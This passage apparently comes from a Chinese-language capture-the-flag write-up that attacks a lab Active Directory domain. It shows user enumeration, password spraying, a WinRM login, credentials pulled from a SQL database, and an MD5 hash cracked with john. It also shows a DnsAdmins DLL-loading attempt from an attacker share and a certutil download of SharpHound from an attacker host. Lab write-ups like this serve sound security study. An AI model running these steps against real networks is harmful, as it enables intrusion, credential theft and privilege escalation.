<span class="token number">1491</span>: CONS<span class="token punctuation">\</span>arlina <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1492</span>: CONS<span class="token punctuation">\</span>arlinda <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1493</span>: CONS<span class="token punctuation">\</span>arline <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1494</span>: CONS<span class="token punctuation">\</span>arluene <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1495</span>: CONS<span class="token punctuation">\</span>arly <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1496</span>: CONS<span class="token punctuation">\</span>arlyn <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1497</span>: CONS<span class="token punctuation">\</span>arlyne <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1498</span>: CONS<span class="token punctuation">\</span>aryn <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1499</span>: CONS<span class="token punctuation">\</span>Office Admin <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1500</span>: CONS<span class="token punctuation">\</span>IT Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1501</span>: CONS<span class="token punctuation">\</span>Executives <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1502</span>: CONS<span class="token punctuation">\</span>Senior management <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1503</span>: CONS<span class="token punctuation">\</span>Project management <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1504</span>: CONS<span class="token punctuation">\</span>Finance <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1505</span>: CONS<span class="token punctuation">\</span>HR <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1506</span>: CONS<span class="token punctuation">\</span>Marketing <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1507</span>: CONS<span class="token punctuation">\</span>Sales <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1508</span>: CONS<span class="token punctuation">\</span>Support <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1509</span>: CONS<span class="token punctuation">\</span>Junior staff <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1512</span>: CONS<span class="token punctuation">\</span>Aplication Management <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1519</span>: CONS<span class="token punctuation">\</span>Svc_Accounts <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1522</span>: CONS<span class="token punctuation">\</span>GMSA_SQL$ <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1523</span>: CONS<span class="token punctuation">\</span>sqldb <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1524</span>: CONS<span class="token punctuation">\</span>toolsdb <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1525</span>: CONS<span class="token punctuation">\</span>MSOL <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span></code></pre>
<p>导出一下用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'s/^.*\\\(.*\) .*/\1/p'</span> <span class="token operator">></span> username.txt       <span class="token punctuation">[</span><span class="token number">17</span>:00:32<span class="token punctuation">]</span>

root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> username.txt                                                    <span class="token punctuation">[</span><span class="token number">17</span>:01:13<span class="token punctuation">]</span>
Enterprise Read-only Domain Controllers
Administrator
Guest
krbtgt
DefaultAccount
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Cert Publishers
Schema Admins
Enterprise Admins
Group Policy Creator Owners
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
RAS and IAS Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
WIN-C73PROQLRHL$
DnsAdmins
DnsUpdateProxy
SQLServer2005SQLBrowserUser<span class="token variable">$WIN</span>-C73PROQLRHL
sqlsvc
jwats
appolonia
april
aprilette
ara
arabel
arabela
arabele
arabella
arabelle
arda
ardath
ardeen
ardelia
ardelis
ardella
ardelle
arden
ardene
ardenia
ardine
ardis
ardisj
ardith
ardra
ardyce
ardys
ardyth
aretha
ariadne
ariana
aridatha
ariel
ariela
ariella
arielle
arlana
arlee
arleen
arlen
arlena
arlene
arleta
arlette
arleyne
arlie
arliene
arlina
arlinda
arline
arluene
arly
arlyn
arlyne
aryn
Office Admin
IT Admins
Executives
Senior management
Project management
Finance
HR
Marketing
Sales
Support
Junior staff
Aplication Management
Svc_Accounts
GMSA_SQL$
sqldb
toolsdb
MSOL</code></pre>
<p>爆破一下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.31.207 <span class="token parameter variable">-u</span> username.txt <span class="token parameter variable">-p</span> username.txt --continue-on-success</code></pre>
<p>均失败</p>
<h2 id="winrm登录"><a href="#winrm登录" class="headerlink" title="winrm登录"></a>winrm登录</h2><p>尝试winrm登录sqldb用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.31.207 <span class="token parameter variable">-u</span> <span class="token string">"sqldb"</span> <span class="token parameter variable">-p</span> au7umn@                                                                               <span class="token punctuation">[</span><span class="token number">17</span>:03:03<span class="token punctuation">]</span>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqldb<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
cons<span class="token punctuation">\</span>sqldb</code></pre>
<p>连接成功</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> gci


    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       <span class="token number">10</span>/31/2024   <span class="token number">6</span>:23 PM           <span class="token number">2231</span> Database.kdbx</code></pre>
<p>文档目录下有个Database.kdbx文件，这是一个密码管理工具</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  keepass2john Database.kdbx                                                                                                      
<span class="token operator">!</span> Database.kdbx <span class="token builtin class-name">:</span> File version <span class="token string">'40000'</span> is currently not supported<span class="token operator">!</span></code></pre>
<p>解不了，先放放，换另一个用户看看</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>appolonia<span class="token punctuation">\</span>Documents<span class="token operator">></span> gci


    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>appolonia<span class="token punctuation">\</span>Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        <span class="token number">10</span>/7/2024   <span class="token number">5</span>:05 PM             <span class="token number">32</span> User.flag.txt


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>appolonia<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">type</span> User.flag.txt
de4769769d10f96ae069e9926a10454e</code></pre>
<p>拿到user flag<br>看一下用户权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>appolonia<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /all

<span class="token environment constant">USER</span> INFORMATION
----------------

User Name      SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
cons<span class="token punctuation">\</span>appolonia S-1-5-21-2838722739-4169515792-1136184259-1445


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Pre-Windows <span class="token number">2000</span> Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CONS<span class="token punctuation">\</span>Support                                Group            S-1-5-21-2838722739-4169515792-1136184259-1508 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="token builtin class-name">set</span> Enabled


<span class="token environment constant">USER</span> CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support <span class="token keyword">for</span> Dynamic Access Control on this device has been disabled.</code></pre>
<p>没什么有用的信息，先看一下数据库用户，说不定可以从数据库下手</p>
<h2 id="sql-server信息收集"><a href="#sql-server信息收集" class="headerlink" title="sql server信息收集"></a>sql server信息收集</h2><pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqldb<span class="token operator">></span> sqlcmd -?
Microsoft <span class="token punctuation">(</span>R<span class="token punctuation">)</span> SQL Server Command Line Tool
Version <span class="token number">15.0</span>.2000.5 NT
<span class="token punctuation">..</span>.</code></pre>
<p>有sqlcmd，查询一下用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqldb<span class="token punctuation">\</span>Documents<span class="token operator">></span> sqlcmd <span class="token parameter variable">-E</span> <span class="token parameter variable">-S</span> .<span class="token punctuation">\</span>SQLEXPRESS <span class="token parameter variable">-Q</span> <span class="token string">"select name from sys.databases"</span>
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB
toolsdb

<span class="token punctuation">(</span><span class="token number">6</span> rows affected<span class="token punctuation">)</span></code></pre>
<p>拿到一个用户及其哈希</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqldb<span class="token punctuation">\</span>Documents<span class="token operator">></span> sqlcmd <span class="token parameter variable">-S</span> .<span class="token punctuation">\</span>SQLEXPRESS <span class="token parameter variable">-d</span> <span class="token string">"CredentialsDB"</span>  <span class="token parameter variable">-Q</span> <span class="token string">"select * from dbo.credentials"</span>
ID          Username                                           Password
----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
          <span class="token number">1</span> sqlsvc                                             a6d888301de7aa3b380a691d32837627

<span class="token punctuation">(</span><span class="token number">1</span> rows affected<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john aaa <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/seclists/Passwords/seasons.txt <span class="token parameter variable">--format</span><span class="token operator">=</span>Raw-MD5                                                   <span class="token punctuation">[</span><span class="token number">17</span>:42:47<span class="token punctuation">]</span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>Raw-MD5 <span class="token punctuation">[</span>MD5 <span class="token number">256</span>/256 AVX2 8x3<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
<span class="token variable">$PRING2021</span><span class="token comment">#      (?)     </span>
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2024</span>-12-03 <span class="token number">17</span>:43<span class="token punctuation">)</span> <span class="token number">100</span>.0g/s 38400p/s 38400c/s 38400C/s <span class="token variable">$pr1ng</span><span class="token punctuation">..</span><span class="token variable">$umm3r2021</span>%
Use the <span class="token string">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.</code></pre>
<p>跑出密码是<code>$PRING2021#</code><br>看一下这个用户权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /all

<span class="token environment constant">USER</span> INFORMATION
----------------

User Name   SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
cons<span class="token punctuation">\</span>sqlsvc S-1-5-21-2838722739-4169515792-1136184259-1104


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Pre-Windows <span class="token number">2000</span> Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CONS<span class="token punctuation">\</span>Svc_Accounts                           Group            S-1-5-21-2838722739-4169515792-1136184259-1519 Mandatory group, Enabled by default, Enabled group
CONS<span class="token punctuation">\</span>DnsAdmins                              Alias            S-1-5-21-2838722739-4169515792-1136184259-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="token punctuation">\</span>NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="token builtin class-name">set</span> Enabled


<span class="token environment constant">USER</span> CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support <span class="token keyword">for</span> Dynamic Access Control on this device has been disabled.</code></pre>
<p>对比可以注意到sqlsvc在这两个组下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">CONS<span class="token punctuation">\</span>Svc_Accounts                           Group            S-1-5-21-2838722739-4169515792-1136184259-1519 Mandatory group, Enabled by default, Enabled group
CONS<span class="token punctuation">\</span>DnsAdmins</code></pre>
<p>DnsAdmins是个特权组<br>DnsAdmins 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）上加载具有 SYSTEM 权限的任意 DLL。<br>尝试使用这个权限提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> dnscmd  /config /serverlevelplugindll <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.31.34<span class="token punctuation">\</span>share<span class="token punctuation">\</span>exp.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> sc.exe <span class="token punctuation">\</span><span class="token punctuation">\</span>cons.thl stop dns
<span class="token punctuation">[</span>SC<span class="token punctuation">]</span> OpenService FAILED <span class="token number">5</span>:

Access is denied.</code></pre>
<p>好吧，没有权限，可能是Alias 组没有给这个用户操作DNS的权限。<br>下手点只能是Svc_Accounts 组了，这个组应该自定义的组，不知道其具体权限，需要传个bloodhound分析一下攻击路径</p>
<h2 id="bloodhound分析"><a href="#bloodhound分析" class="headerlink" title="bloodhound分析"></a>bloodhound分析</h2><p>先用<code>SharpHound.exe</code>收集域内信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> certutil.exe <span class="token parameter variable">-urlcache</span> <span class="token parameter variable">-split</span> <span class="token parameter variable">-f</span> http://192.168.31.34:6677/SharpHound.exe
****  Online  ****
  000000  <span class="token punctuation">..</span>.
  100c00
CertUtil: <span class="token parameter variable">-URLCache</span> <span class="token builtin class-name">command</span> completed successfully.
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> gci


    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       <span class="token number">10</span>/31/2024   <span class="token number">6</span>:23 PM           <span class="token number">2231</span> Database.kdbx
-a----        <span class="token number">12</span>/3/2024  <span class="token number">10</span>:54 AM              <span class="token number">5</span> sdshow
-a----        <span class="token number">12</span>/3/2024  <span class="token number">11</span>:03 AM        <span class="token number">1051648</span> SharpHound.exe
`<span class="token variable"><span class="token variable">`</span>
<span class="token variable">`</span></span>``bash
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span> ./SharpHound.exe <span class="token parameter variable">-c</span> all
<span class="token number">2024</span>-12-03T11:05:21.0255359+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>This version of SharpHound is compatible with the <span class="token number">4.2</span> Release of BloodHound
<span class="token number">2024</span>-12-03T11:05:21.1032071+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
<span class="token number">2024</span>-12-03T11:05:21.1032071+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Initializing SharpHound at <span class="token number">11</span>:05 on 03/12/2024
<span class="token number">2024</span>-12-03T11:05:21.1971536+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
<span class="token number">2024</span>-12-03T11:05:21.2598286+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Beginning LDAP search <span class="token keyword">for</span> cons.thl
<span class="token number">2024</span>-12-03T11:05:21.3068339+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Producer has finished, closing LDAP channel
<span class="token number">2024</span>-12-03T11:05:21.3068339+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>LDAP channel closed, waiting <span class="token keyword">for</span> consumers
<span class="token number">2024</span>-12-03T11:05:51.6665468+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Status: <span class="token number">0</span> objects finished <span class="token punctuation">(</span>+0 <span class="token number">0</span><span class="token punctuation">)</span>/s -- Using <span class="token number">35</span> MB RAM
<span class="token number">2024</span>-12-03T11:06:07.9942731+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Consumers finished, closing output channel
<span class="token number">2024</span>-12-03T11:06:08.0098831+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Output channel closed, waiting <span class="token keyword">for</span> output task to complete
Closing writers
<span class="token number">2024</span>-12-03T11:06:08.1032280+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Status: <span class="token number">192</span> objects finished <span class="token punctuation">(</span>+192 <span class="token number">4.173913</span><span class="token punctuation">)</span>/s -- Using <span class="token number">42</span> MB RAM
<span class="token number">2024</span>-12-03T11:06:08.1032280+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Enumeration finished <span class="token keyword">in</span> 00:00:46.8561079
<span class="token number">2024</span>-12-03T11:06:08.1723545+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>Saving cache with stats: <span class="token number">152</span> ID to <span class="token builtin class-name">type</span> mappings.
 <span class="token number">152</span> name to SID mappings.
 <span class="token number">0</span> machine sid mappings.
 <span class="token number">2</span> sid to domain mappings.
 <span class="token number">0</span> global catalog mappings.
<span class="token number">2024</span>-12-03T11:06:08.1815043+01:00<span class="token operator">|</span>INFORMATION<span class="token operator">|</span>SharpHound Enumeration Completed at <span class="token number">11</span>:06 on 03/12/2024<span class="token operator">!</span> Happy Graphing<span class="token operator">!</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>sqlsvc<span class="token punctuation">\</span>Documents<span class="token operator">></span></code></pre>
